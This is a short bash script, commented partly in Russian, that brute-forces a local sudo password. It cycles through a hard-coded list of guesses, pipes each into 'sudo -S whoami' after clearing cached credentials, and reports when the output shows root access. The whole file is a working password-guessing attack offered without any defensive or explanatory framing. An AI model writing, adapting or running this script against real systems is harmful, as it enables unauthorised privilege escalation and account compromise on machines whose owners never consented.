#!/bin/bash

PASSWORDS=(one two three password123 five)
touch /tmp/temp_file
for P in ${PASSWORDS[@]}
do
    # -k инвалидирует тикет, -S читает пароль из stdin
    sudo -k && echo "$P" | sudo -S whoami &>/tmp/temp_file
    if grep --quiet "root" /tmp/temp_file
    then 
        echo "[*] $(date +'%Y-%m-%dT%T%Z') SUCCESS: Sudo password found => $P"
        break
    else 
        echo "[-] $(date +'%Y-%m-%dT%T%Z') FAILED: Tried password: $P"
    fi
    sleep 1
done
rm /tmp/temp_file
